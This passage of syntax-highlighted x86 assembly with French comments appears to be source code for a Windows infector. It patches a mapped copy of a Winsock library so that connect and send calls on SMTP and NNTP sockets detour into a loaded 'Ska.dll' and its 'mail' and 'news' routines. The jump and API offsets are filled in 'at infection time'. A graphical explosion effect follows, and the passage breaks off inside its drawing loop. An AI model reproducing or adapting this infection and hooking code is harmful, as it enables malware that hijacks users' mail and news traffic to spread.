    </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;stocke le no de socket connectée au port 119 </span><span class="sc0">
                    </span><span class="sc1">;(dans no_socket_news)</span><span class="sc0">
    
    </span><span class="sc1">;------ on charge ma librairie (LoadLibrary)</span><span class="sc0">

    </span><span class="sc5">la_suite</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ici_offset_de_ll</span><span class="sc0">           </span><span class="sc1">;pour avoir "madll.dll" sur le stack</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Ska.dll"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">ici_offset_de_ll</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">;!!!transformé au moment de l'infection!!!!!</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call LoadLibrary</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;sauver le handle de ma librairie</span><span class="sc0">

    </span><span class="sc1">;------ et on se casse</span><span class="sc0">

    </span><span class="sc5">retour_a_connect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">
    </span><span class="sc5">ici_retour_relatif_a_connect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;!!!transformé au moment de l'infection!!!!!</span><span class="sc0">

    </span><span class="sc1">;================&gt; point d'entrée de la nouvelle send &lt;============================</span><span class="sc0">

    </span><span class="sc5">redirect_to_my_send</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushfd</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc1">;----- chope delta offset</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta2</span><span class="sc0">
    </span><span class="sc5">delta2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">no_socket_mail</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta2</span><span class="sc0">

    </span><span class="sc1">;----- on vérifie le numero de socket</span><span class="sc0">

    </span><span class="sc6">lodsw</span><span class="sc0">                   </span><span class="sc1">;no_socket_mail = al, no_socket_news = ah</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;no de socket de la session actuelle</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;la socket actuelle est liée au port 119?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">send_port_nntp</span><span class="sc0">           </span><span class="sc1">;oui =&gt; on va ds la dll, routine "news"</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;la socket actuelle est liée au port 25?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">send_port_smtp</span><span class="sc0">           </span><span class="sc1">;oui =&gt; on va ds la dll, routine "mail"</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">retour_a_send</span><span class="sc0">           </span><span class="sc1">;socket actuelle liée à autre port, on revient</span><span class="sc0">

    </span><span class="sc1">;------ récupérer l'offset de ma fonction (GetProcAddress)</span><span class="sc0">

    </span><span class="sc5">send_port_smtp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">zz_getprocad1</span><span class="sc0">          </span><span class="sc1">;pour avoir "mail" sur le stack</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"mail"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">send_port_nntp</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">zz_getprocad1</span><span class="sc0">          </span><span class="sc1">;pour avoir "news" sur le stack</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"news"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

    </span><span class="sc5">zz_getprocad1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;récup du handle de ma librairie</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;handle de ma librairie</span><span class="sc0">
    </span><span class="sc5">ici_offset_de_gpa</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">;!!!transformé au moment de l'infection!!!!</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call GetProcAddress</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;probleme?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">retour_a_send</span><span class="sc0">            </span><span class="sc1">;oui =&gt; on se casse</span><span class="sc0">

    </span><span class="sc1">;------ appeler ma fonction avant send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call MaFonction dans ma dll</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;si en retour al=1, on ne décharge pas ma dll</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">retour_a_send</span><span class="sc0">            </span><span class="sc1">;mais on revient simplement au send original</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">             </span><span class="sc1">;dans bl on a "N" ou "M"</span><span class="sc0">

    </span><span class="sc1">;------ ma fonction a fini son travail?</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta3</span><span class="sc0">
    </span><span class="sc5">delta3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">no_socket_mail</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta3</span><span class="sc0">    </span><span class="sc1">;esi pointe vers no_socket_mail</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;edi aussi</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"N"</span><span class="sc0">             </span><span class="sc1">;une session news a foiré?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">autre</span><span class="sc0">               </span><span class="sc1">;non =&gt; teste si c'est du mail</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;edi pointe vers no_socket_news</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;on annule le hook de send_news</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;et on regarde si send_mail est toujours hooké</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">retour_a_send</span><span class="sc0">           </span><span class="sc1">;send_mail est toujours hooké =&gt; on revient</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;esi pointe vers handle_madll</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">unload_dll</span><span class="sc0">              </span><span class="sc1">;send_mail n'est pas hooké non plus </span><span class="sc0">
                        </span><span class="sc1">;=&gt; on décharge ma dll (facon de parler)</span><span class="sc0">

    </span><span class="sc5">autre</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"M"</span><span class="sc0">             </span><span class="sc1">;une session mail a foiré?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">retour_a_send</span><span class="sc0">           </span><span class="sc1">;non =&gt; on revient</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;on annule le hook de send_mail</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;edi pointe vers handle_madll</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;esi pointe vers no_socket_news</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;on regarde si send_news est toujours hooké</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">retour_a_send</span><span class="sc0">           </span><span class="sc1">;send_news est toujours hooké =&gt; on revient</span><span class="sc0">

    </span><span class="sc1">;------ si oui, on décharge ma librairie</span><span class="sc0">

    </span><span class="sc5">unload_dll</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;handle de ma dll dans eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">ici_offset_de_fl</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">;!!!transformé au moment de l'infection!!!!!</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;call FreeLibrary</span><span class="sc0">

    </span><span class="sc1">;----- on revient au send original</span><span class="sc0">

    </span><span class="sc5">retour_a_send</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">popfd</span><span class="sc0">
    </span><span class="sc5">ici_retour_relatif_a_send</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">;!!!transformé au moment de l'infection!!!!!</span><span class="sc0">

    </span><span class="sc5">no_socket_mail</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">no_socket_news</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;ne pas séparer ces trois enfoirés</span><span class="sc0">
    </span><span class="sc5">handle_madll</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    
    </span><span class="sc5">endpatch</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc1">;***************************** FIN DU CODE INSERE ******************</span><span class="sc0">


</span><span class="sc1">;------ écrire le code dans l'image mappée</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endpatch</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startpatch</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc1">;------ écrire les bonnes références aux 3 API du kernel</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">llofs</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endpatch</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ici_offset_de_ll</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">gpaofs</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endpatch</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ici_offset_de_gpa</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">flofs</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endpatch</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ici_offset_de_fl</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;----- écrire les bons sauts de retour</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cdiff</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rvaendofcode</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ici_retour_relatif_a_connect</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startpatch</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rvaoriginale_1</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endpatch</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ici_retour_relatif_a_connect</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rvaendofcode</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ici_retour_relatif_a_send</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startpatch</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rvaoriginale_2</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">endpatch</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ici_retour_relatif_a_send</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">stop5</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">startoffilemapping</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

</span><span class="sc5">stop4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">filemappinghandle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">stop3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">wsock_handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">stop2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">writebuffer</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocalFree</span><span class="sc0">

</span><span class="sc5">stop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">pas_d_effet_graphique</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">effet_graphique</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">             </span><span class="sc1">;this simply terminates the program</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                                 EFFET GRAPHIQUE                                     ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc5">effet_graphique</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">nombre_explosion_maxi</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc1">;----- se réserver de la mémoire</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">32</span><span class="sc4">*</span><span class="sc2">257</span><span class="sc4">)*</span><span class="sc5">nombre_explosion_maxi</span><span class="sc0">     </span><span class="sc1">;number of bytes to allocate</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">;allocation attributes (40h=LMEM_ZEROINIT)</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocalAlloc</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">writebuffer</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;----- enregistrer la wndclass</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">clsHInstance</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wndproc</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">clsLpfnWndProc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">clsLpszClassName</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nom_fenetre</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wndclass</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegisterClassA</span><span class="sc0">

</span><span class="sc1">;----- creer la fenetre</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">            </span><span class="sc1">;hauteur</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">            </span><span class="sc1">;largeur</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">            </span><span class="sc1">;y</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">            </span><span class="sc1">;x</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00080000h</span><span class="sc4">+</span><span class="sc2">00040000h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nom_fenetre</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">nom_fenetre</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;extra style</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateWindowExA</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">handle_wd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle_wd</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ShowWindow</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle_wd</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">UpdateWindow</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">handle_wd</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetDC</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">theDC</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;----- le message loop</span><span class="sc0">

</span><span class="sc5">msg_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PeekMessageA</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">process_messages</span><span class="sc0">

</span><span class="sc1">;-------- dessiner tous les points</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">compteur</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nombre_explosion_maxi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">compteur</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ini_explosion</span><span class="sc0">

</span><span class="sc5">la_suite@</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">*</span><span class="sc2">256</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">writebuffer</span><span class="sc0">

</span><span class="sc5">zozo2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
